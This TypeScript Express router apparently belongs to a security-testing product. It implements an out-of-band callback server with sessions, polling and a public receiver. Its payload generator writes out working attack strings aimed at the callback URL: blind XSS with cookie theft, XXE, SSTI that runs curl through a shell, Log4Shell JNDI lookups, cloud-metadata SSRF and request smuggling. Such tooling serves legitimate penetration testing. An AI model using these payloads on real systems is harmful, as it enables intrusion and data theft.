// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
/**
 * OAST — Real Out-of-Band Application Security Testing Callback Server
 * Copyright © 2024–2026 ALPHA UNLIMITED TECHNOLOGIES LLC
 * All rights reserved.
 *
 * Provides:
 *   POST /api/oast/session         — create a new OAST session, get unique callback URL
 *   GET  /api/oast/poll/:sessionId — poll for incoming callbacks (long-poll 20s)
 *   ANY  /api/oast/cb/:token       — public callback endpoint (OAST payload fires here)
 *   GET  /api/oast/sessions        — list all sessions for the current user
 */
import { Router, Request, Response } from "express";
import { getAuth } from "@clerk/express";
import * as crypto from "crypto";

const router = Router();

interface OastCallback {
  receivedAt: string;
  method: string;
  ip: string;
  headers: Record<string, string>;
  query: Record<string, string>;
  body: string;
  path: string;
}

interface OastSession {
  sessionId: string;
  token: string;
  callbackUrl: string;
  userId: string;
  createdAt: string;
  label: string;
  callbacks: OastCallback[];
  waiters: Array<(cbs: OastCallback[]) => void>;
}

const sessions = new Map<string, OastSession>();
const tokenToSession = new Map<string, string>();

function uid(req: Request): string {
  return (getAuth(req) as any)?.userId ?? "anon";
}

function getBaseUrl(req: Request): string {
  const proto = req.headers["x-forwarded-proto"] || req.protocol || "https";
  const host  = req.headers["x-forwarded-host"] || req.headers.host || "localhost";
  return `${proto}://${host}`;
}

// ── Create a new OAST session ─────────────────────────────────────────────────
router.post("/session", (req: Request, res: Response) => {
  const userId = uid(req);
  const sessionId = `oast_${crypto.randomBytes(8).toString("hex")}`;
  const token    = crypto.randomBytes(16).toString("hex");
  const base     = getBaseUrl(req);

  const session: OastSession = {
    sessionId,
    token,
    callbackUrl: `${base}/api/oast/cb/${token}`,
    userId,
    createdAt: new Date().toISOString(),
    label: (req.body?.label as string) || "Unnamed session",
    callbacks: [],
    waiters: [],
  };

  sessions.set(sessionId, session);
  tokenToSession.set(token, sessionId);

  res.json({
    sessionId,
    token,
    callbackUrl: session.callbackUrl,
    payloads: generatePayloadExamples(session.callbackUrl, token),
  });
});

// ── Long-poll for callbacks (waits up to 20s) ─────────────────────────────────
router.get("/poll/:sessionId", (req: Request, res: Response) => {
  const session = sessions.get(String(String(req.params.sessionId)));
  if (!session) return res.status(404).json({ error: "Session not found" });
  if (session.userId !== uid(req)) return res.status(403).json({ error: "Forbidden" });

  if (session.callbacks.length > 0) {
    return res.json({ sessionId: session.sessionId, callbacks: session.callbacks, count: session.callbacks.length });
  }

  const timeout = setTimeout(() => {
    session.waiters = session.waiters.filter(w => w !== resolve);
    res.json({ sessionId: session.sessionId, callbacks: [], count: 0, timedOut: true });
  }, 20_000);

  function resolve(cbs: OastCallback[]) {
    clearTimeout(timeout);
    res.json({ sessionId: session!.sessionId, callbacks: cbs, count: cbs.length });
  }

  session.waiters.push(resolve);
  res.on("close", () => {
    clearTimeout(timeout);
    session.waiters = session.waiters.filter(w => w !== resolve);
  });
});

// ── Get session status ────────────────────────────────────────────────────────
router.get("/session/:sessionId", (req: Request, res: Response) => {
  const session = sessions.get(String(String(req.params.sessionId)));
  if (!session) return res.status(404).json({ error: "Session not found" });
  if (session.userId !== uid(req)) return res.status(403).json({ error: "Forbidden" });
  const { waiters, ...safe } = session;
  res.json(safe);
});

// ── List user sessions ────────────────────────────────────────────────────────
router.get("/sessions", (req: Request, res: Response) => {
  const userId = uid(req);
  const userSessions = Array.from(sessions.values())
    .filter(s => s.userId === userId)
    .map(({ waiters, ...s }) => s)
    .sort((a, b) => b.createdAt.localeCompare(a.createdAt))
    .slice(0, 20);
  res.json({ sessions: userSessions });
});

// ── Delete session ────────────────────────────────────────────────────────────
router.delete("/session/:sessionId", (req: Request, res: Response) => {
  const session = sessions.get(String(String(req.params.sessionId)));
  if (!session) return res.status(404).json({ error: "Session not found" });
  if (session.userId !== uid(req)) return res.status(403).json({ error: "Forbidden" });
  tokenToSession.delete(session.token);
  sessions.delete(String(String(req.params.sessionId)));
  res.json({ deleted: true });
});

// ── PUBLIC: Callback receiver — OAST payloads fire here ───────────────────────
router.all("/cb/:token", (req: Request, res: Response) => {
  const sessionId = tokenToSession.get(String(req.params.token));
  if (!sessionId) {
    res.setHeader("Content-Type", "text/plain");
    return res.status(404).send("OAST: token not found");
  }

  const session = sessions.get(sessionId);
  if (!session) {
    return res.status(404).send("OAST: session expired");
  }

  let body = "";
  req.on("data", (chunk) => { if (body.length < 8192) body += chunk.toString(); });
  req.on("end", () => {
    const cb: OastCallback = {
      receivedAt: new Date().toISOString(),
      method: req.method,
      ip: (req.headers["x-forwarded-for"] as string) || req.socket.remoteAddress || "unknown",
      headers: Object.fromEntries(
        Object.entries(req.headers).map(([k, v]) => [k, Array.isArray(v) ? v.join(", ") : (v || "")])
      ),
      query: req.query as Record<string, string>,
      body,
      path: req.path,
    };

    session.callbacks.push(cb);

    // Wake up any long-poll waiters
    for (const waiter of session.waiters) {
      waiter(session.callbacks);
    }
    session.waiters = [];

    res.setHeader("Content-Type", "text/plain");
    res.send("OK");
  });
});

// ── Generate payload examples for each attack class ──────────────────────────
function generatePayloadExamples(cbUrl: string, token: string) {
  const enc = encodeURIComponent(cbUrl);
  return {
    ssrf: [
      { label: "URL parameter", payload: `?url=${enc}` },
      { label: "Redirect param", payload: `?redirect=${enc}` },
      { label: "Webhook param",  payload: `?webhook=${enc}` },
      { label: "Image fetch",    payload: `?image=${enc}` },
    ],
    blindXss: [
      { label: "Script src",     payload: `<script src="${cbUrl}"></script>` },
      { label: "Fetch on error", payload: `"><img src=x onerror=fetch('${cbUrl}')>` },
      { label: "Link prefetch",  payload: `<link rel=prefetch href="${cbUrl}">` },
      { label: "Fetch API",      payload: `';fetch('${cbUrl}?c='+document.cookie)//` },
    ],
    xxe: [
      { label: "System entity",  payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "${cbUrl}">]><foo>&xxe;</foo>` },
      { label: "Param entity",   payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % oob SYSTEM "${cbUrl}"> %oob;]><foo/>` },
    ],
    ssti: [
      { label: "Jinja2/Twig",    payload: `{{''.__class__.__mro__[1].__subclasses__()[257]('curl ${cbUrl}',shell=True).read()}}` },
      { label: "ERB Ruby",       payload: `<%= \`curl ${cbUrl}\` %>` },
      { label: "Velocity",       payload: `#set($x='')\${x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'curl ${cbUrl}')}` },
    ],
    log4shell: [
      { label: "JNDI/DNS",       payload: `\${jndi:dns://${cbUrl.replace(/https?:\/\//, "")}/a}` },
      { label: "JNDI/HTTP",      payload: `\${jndi:ldap://${cbUrl.replace(/https?:\/\//, "")}/exploit}` },
      { label: "Obfuscated",     payload: `\${\${lower:j}ndi:\${lower:l}dap://${cbUrl.replace(/https?:\/\//, "")}/a}` },
    ],
    deserialization: [
      { label: "Java gadget URL", payload: `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcGkAAAAAAAAAAAMAAloAFWRlc2VyaWFsaXpha...` },
      { label: "PHP phar",        payload: `phar://${cbUrl}/test.txt` },
    ],
    openRedirect: [
      { label: "next param",     payload: `?next=${enc}` },
      { label: "return_url",     payload: `?return_url=${enc}` },
      { label: "continue",       payload: `?continue=${enc}` },
    ],
    httpRequestSmuggling: [
      { label: "TE.CL header",   payload: `Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET ${cbUrl} HTTP/1.1\r\nHost: target.com\r\n\r\n` },
    ],
    blindSsrf: [
      { label: "AWS IMDSv1",      payload: `?url=http://169.254.169.254/latest/meta-data/` },
      { label: "GCP metadata",    payload: `?url=http://metadata.google.internal/computeMetadata/v1/` },
      { label: "Azure metadata",  payload: `?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01` },
    ],
  };
}

export default router;
